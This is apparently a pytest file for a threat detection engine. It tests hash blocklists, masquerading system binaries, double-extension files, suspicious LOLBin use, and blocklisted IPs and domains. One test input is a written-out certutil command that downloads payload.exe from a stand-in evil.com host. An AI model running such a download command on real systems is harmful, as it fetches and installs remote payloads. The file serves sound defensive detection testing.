"""Comprehensive unit tests for the Threat Detection Engine and reputation checks."""

from engine.reputation import ThreatReputationManager
from engine.threat_detector import ThreatDetectionEngine


def test_hash_reputation_blocklist_and_allowlist():
    rep = ThreatReputationManager(
        trusted_hashes={"0000000000000000000000000000000000000000000000000000000000000001"},
        blocklist_hashes={"deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef": "Test Ransomware"},
    )

    bad = rep.check_hash_reputation("deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef")
    assert bad["status"] == "malicious"
    assert bad["is_blocklisted"] is True
    assert bad["threat_name"] == "Test Ransomware"

    good = rep.check_hash_reputation("0000000000000000000000000000000000000000000000000000000000000001")
    assert good["status"] == "trusted"
    assert good["is_allowlisted"] is True

    unknown = rep.check_hash_reputation("1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef")
    assert unknown["status"] == "unknown"


def test_masquerading_detection():
    rep = ThreatReputationManager()

    # Core system binary executing from user AppData -> Masquerading!
    assert rep.check_masquerading("svchost.exe", r"C:\Users\User\AppData\Local\svchost.exe") is True
    assert rep.check_masquerading("lsass.exe", r"C:\Temp\lsass.exe") is True

    # Legitimate system binary running in System32 -> Clean
    assert rep.check_masquerading("svchost.exe", r"C:\Windows\System32\svchost.exe") is False
    assert rep.check_masquerading("notepad.exe", r"C:\Users\User\AppData\notepad.exe") is False


def test_double_extension_detection():
    rep = ThreatReputationManager()

    assert rep.check_double_extension("invoice.pdf.exe") is True
    assert rep.check_double_extension("salary_slip.docx.scr") is True
    assert rep.check_double_extension("picture.jpg.bat") is True
    assert rep.check_double_extension("normal_app.exe") is False
    assert rep.check_double_extension("document.pdf") is False


def test_evaluate_event_process_blocklist_hash(monkeypatch):
    engine = ThreatDetectionEngine()
    monkeypatch.setattr(
        "engine.rules.inspect_signature",
        lambda path: {"status": "Valid", "signer": "Demo"},
    )

    event = {
        "event_type": "process_started",
        "process_name": "malware.exe",
        "pid": 5001,
        "executable": r"C:\Tools\malware.exe",
        "file_metadata": {
            "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",  # Default EICAR test hash
        },
    }

    result = engine.evaluate_event(event)
    assert result["has_threats"] is True
    assert result["severity"] == "critical"
    rule_ids = [f["rule_id"] for f in result["findings"]]
    assert "THREAT_BLOCKLIST_HASH" in rule_ids


def test_evaluate_event_masquerading(monkeypatch):
    engine = ThreatDetectionEngine()
    monkeypatch.setattr(
        "engine.rules.inspect_signature",
        lambda path: {"status": "NotSigned", "signer": None, "message": "Unsigned file."},
    )

    event = {
        "event_type": "process_started",
        "process_name": "svchost.exe",
        "pid": 5002,
        "executable": r"C:\Users\Alice\AppData\Roaming\svchost.exe",
    }

    result = engine.evaluate_event(event)
    assert result["severity"] == "critical"
    rule_ids = [f["rule_id"] for f in result["findings"]]
    assert "PROC_MASQUERADING" in rule_ids


def test_evaluate_event_double_extension(monkeypatch):
    engine = ThreatDetectionEngine()
    monkeypatch.setattr(
        "engine.rules.inspect_signature",
        lambda path: {"status": "NotSigned", "signer": None, "message": "Unsigned file."},
    )

    event = {
        "event_type": "process_started",
        "process_name": "Quarterly_Bonus.pdf.exe",
        "pid": 5003,
        "executable": r"C:\Users\Alice\Downloads\Quarterly_Bonus.pdf.exe",
    }

    result = engine.evaluate_event(event)
    rule_ids = [f["rule_id"] for f in result["findings"]]
    assert "PROC_DOUBLE_EXTENSION" in rule_ids


def test_evaluate_event_lolbin_activity(monkeypatch):
    engine = ThreatDetectionEngine()
    monkeypatch.setattr(
        "engine.rules.inspect_signature",
        lambda path: {"status": "Valid", "signer": "Microsoft Windows"},
    )

    event = {
        "event_type": "process_started",
        "process_name": "certutil.exe",
        "pid": 5004,
        "executable": r"C:\Windows\System32\certutil.exe",
        "command_line": "certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe",
    }

    result = engine.evaluate_event(event)
    rule_ids = [f["rule_id"] for f in result["findings"]]
    assert "PROC_SUSPICIOUS_LOLBIN" in rule_ids


def test_evaluate_event_network_blocklist_ip():
    engine = ThreatDetectionEngine()

    event = {
        "event_type": "network_connection_observed",
        "process_name": "powershell.exe",
        "pid": 5005,
        "remote_ip": "198.51.100.66",  # Default Cobalt Strike test IP
        "remote_port": 443,
        "is_public_ip": True,
    }

    result = engine.evaluate_event(event)
    assert result["severity"] == "critical"
    rule_ids = [f["rule_id"] for f in result["findings"]]
    assert "NET_KNOWN_MALICIOUS_IP" in rule_ids


def test_evaluate_event_dns_blocklist_domain():
    engine = ThreatDetectionEngine()

    event = {
        "event_type": "dns_query_observed",
        "domain": "malicious-c2-test.duckdns.org",
        "is_dynamic_dns": True,
    }

    result = engine.evaluate_event(event)
    assert result["severity"] == "critical"
    rule_ids = [f["rule_id"] for f in result["findings"]]
    assert "DNS_BLOCKLISTED_DOMAIN" in rule_ids


def test_explainable_findings_structure():
    engine = ThreatDetectionEngine()

    event = {
        "event_type": "process_started",
        "process_name": "demo.exe",
        "pid": 5006,
        "executable": r"C:\Users\Alice\Downloads\demo.exe",
    }

    result = engine.evaluate_event(event)
    for finding in result["findings"]:
        # Verify required explainability fields
        assert "rule_id" in finding and isinstance(finding["rule_id"], str)
        assert "title" in finding and isinstance(finding["title"], str)
        assert finding["severity"] in {"info", "low", "medium", "high", "critical"}
        assert finding["confidence"] in {"informational", "low", "medium", "high"}
        assert "evidence" in finding and isinstance(finding["evidence"], dict)
        assert "reason" in finding and isinstance(finding["reason"], str)
        assert "explanation" in finding and isinstance(finding["explanation"], str)

